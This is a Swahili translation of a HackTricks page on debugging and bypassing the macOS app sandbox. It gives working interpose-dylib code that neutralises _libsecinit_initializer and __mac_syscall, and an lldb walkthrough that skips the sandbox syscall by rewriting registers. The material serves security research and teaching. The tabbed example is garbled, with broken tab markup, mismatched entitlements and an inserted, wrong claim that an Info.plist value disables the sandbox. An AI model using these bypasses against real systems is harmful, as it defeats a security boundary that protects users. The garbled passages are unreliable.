# macOS Sandbox Debug & Bypass

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Mchakato wa kupakia Sandbox

<figure><img src="../../../../../.gitbook/assets/image (898).png" alt=""><figcaption><p>Picha kutoka <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Katika picha iliyopita ni wazi kuona **jinsi sandbox itakavyopakiwa** wakati programu yenye ruhusa ya **`com.apple.security.app-sandbox`** inapoendeshwa.

Mkuzaji atalinganisha `/usr/lib/libSystem.B.dylib` na binary.

Kisha, **`libSystem.B`** itaita kazi zingine kadhaa hadi **`xpc_pipe_routine`** itakapowatuma ruhusa za programu kwa **`securityd`**. Securityd itachunguza ikiwa mchakato unapaswa kuwekwa karantini ndani ya Sandbox, na ikiwa ndivyo, itawekwa karantini.\
Hatimaye, sandbox itaamilishwa kwa wito wa **`__sandbox_ms`** ambao utaita **`__mac_syscall`**.

## Mabwawa Yanayowezekana

### Kupitisha sifa ya karantini

**Faili zinazoundwa na michakato iliyowekwa kwenye sandbox** zinaongezewa **sifa ya karantini** ili kuzuia kutoroka kwa sandbox. Walakini, ikiwa utaweza **kuunda folda ya `.app` bila sifa ya karantini** ndani ya programu iliyowekwa kwenye sandbox, unaweza kufanya faili ya mfungu wa programu ielekeze kwa **`/bin/bash`** na kuongeza baadhi ya mazingira katika **plist** kutumia **`open`** kuzindua programu mpya bila sandbox.

Hii ndio iliyofanywa katika [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
Kwa hivyo, kwa sasa, ikiwa unaweza tu kuunda folda yenye jina linalomalizika kwa **`.app`** bila sifa ya karantini, unaweza kutoroka kwa sandbox kwa sababu macOS inachunguza tu **sifa ya karantini** katika **folda ya `.app`** na katika **mfungu wa programu** (na tutaelekeza mfungu wa programu kwa **`/bin/bash`**).

Tafadhali kumbuka kwamba ikiwa mfungu wa .app tayari umepewa idhini ya kukimbia (ina xttr ya karantini na bendera ya kuruhusiwa kukimbia), unaweza pia kuitumia... isipokuwa sasa huwezi kuandika ndani ya **folda za `.app`** isipokuwa una ruhusa za TCC za kipekee (ambazo hautakuwa nazo ndani ya sandbox ya juu).
{% endhint %}

### Kutumia Kazi ya Kufungua

Katika [**mifano ya mwisho ya kutoroka kwa sandbox ya Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) inaweza kuonekana jinsi **kazi ya `open`** inaweza kutumiwa vibaya kutoroka kwa sandbox.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Mawakala/Maemoni ya Kuzindua

Hata ikiwa programu inakusudiwa kuwa kwenye sandbox (`com.apple.security.app-sandbox`), inawezekana kutoroka kwa sandbox ikiwa itatekelezwa kutoka kwa Mwakilishi wa Kuzindua (`~/Library/LaunchAgents`) kwa mfano.\
Kama ilivyoelezwa katika [**chapisho hili**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), ikiwa unataka kupata uthabiti na programu iliyowekwa kwenye sandbox unaweza kufanya iweze kutekelezwa moja kwa moja kama Mwakilishi wa Kuzindua na labda kuingiza msimbo wa uovu kupitia mazingira ya DyLib.

### Kutumia Maeneo ya Kuanza Kiotomatiki

Ikiwa mchakato uliowekwa kwenye sandbox unaweza **kuandika** mahali ambapo **baadaye programu isiyowekwa kwenye sandbox itakayotekelezwa binary**, itaweza **kutoroka kwa kuweka** hapo binary. Mfano mzuri wa maeneo kama haya ni `~/Library/LaunchAgents` au `/System/Library/LaunchDaemons`.

Kwa hili unaweza hata kuhitaji **hatua 2**: Kufanya mchakato na **sandbox yenye ruhusa zaidi** (`file-read*`, `file-write*`) itekeleze msimbo wako ambao utaandika mahali ambapo itatekelezwa **bila sandbox**.

Angalia ukurasa huu kuhusu **Maeneo ya Kuanza Kiotomatiki**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Kutumia michakato mingine

Ikiwa kutoka kwa mchakato wa sandbox unaweza **kuathiri michakato mingine** inayotekelezwa katika mabwawa ya mchanga yenye vikwazo vichache (au hakuna), utaweza kutoroka kwa mabwawa yao ya mchanga:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Kukusanya Statically & Kufunga Kwa Kudumu

[**Utafiti huu**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) uligundua njia 2 za kutoroka kwa Sandbox. Kwa sababu sandbox inatekelezwa kutoka kwa userland wakati maktaba ya **libSystem** inapopakiwa. Ikiwa binary inaweza kuepuka kupakia, kamwe haitapata sandbox:

* Ikiwa binary ilikuwa **imekamilika kufungwa kwa kudumu**, inaweza kuepuka kupakia maktaba hiyo.
* Ikiwa **binary haitahitaji kupakia maktaba yoyote** (kwa sababu linker pia iko katika libSystem), haitahitaji kupakia libSystem.

### Shellcodes

Tafadhali kumbuka kwamba **hata shellcodes** katika ARM64 inahitaji kuunganishwa katika `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Haki za Kibali

Tafadhali kumbuka kwamba hata kama baadhi ya **vitendo** vinaweza kuruhusiwa na **sandbox** ikiwa programu ina **haki maalum**, kama vile:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Kupitisha Kizuizi

Kwa habari zaidi kuhusu **Kupitisha Kizuizi**, tazama:

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### Kupitisha `_libsecinit_initializer` ili kuzuia sanduku ya mchanga
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` kuzuia Sanduku la Mchanga

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Kurekebisha na Kupita kizuizi cha Sandbox na lldb

Tujenge programu ambayo inapaswa kuwa na kizuizi cha sandbox:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %} 

### Mipangilio ya Kibali

Faili hii inaorodhesha vibali vyote vinavyohitajika na programu ili kufanya kazi kwenye mchakato wa sandbox. Unaweza kuhariri faili hii ili kubadilisha au kuongeza vibali vinavyohitajika. Kumbuka kwamba kuhariri vibali kunaweza kusababisha programu kushindwa kufanya kazi vizuri au kukiuka usalama wa sandbox. Jihadharini na mabadiliko unayofanya. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>com.apple.security.network.client</key>
	<true/>
	<key>com.apple.security.files.user-selected.read-write</key>
	<true/>
</dict>
</plist>
```

Katika mfano huu, programu inahitaji vibali vya kufanya mawasiliano na mtandao na kusoma/kuandika faili ambazo mtumiaji amechagua. 

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %} 

### Mipangilio ya Info.plist

Faili ya Info.plist inaweza kubadilishwa ili kuzuia sandboxing kwa programu. Unaweza kufanya hivyo kwa kubadilisha thamani ya `com.apple.security.app-sandbox` kuwa `NO`. Hii itaruhusu programu kufanya kazi bila ya kizuizi cha sandbox. Kumbuka kuwa hii inaweza kupunguza usalama wa mfumo wako. 

```xml
<key>com.apple.security.app-sandbox</key>
<false/>
```

{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Kisha unda programu:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Programu itajaribu **kusoma** faili **`~/Desktop/del.txt`**, ambayo **Sandbox haitaruhusu**.\
Unda faili hapo kwani mara tu Sandbox itakapopuuzwa, itaweza kuisoma:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Hebu tuangalie kwa karibu programu ili tuone lini Sanduku la Mchanga linapakia:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Hata baada ya kufanikiwa kukiuka Sanduku la mchanga, TCC** itamuuliza mtumiaji ikiwa anataka kuruhusu mchakato kusoma faili kutoka kwenye desktop
{% endhint %}

## Marejeo

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
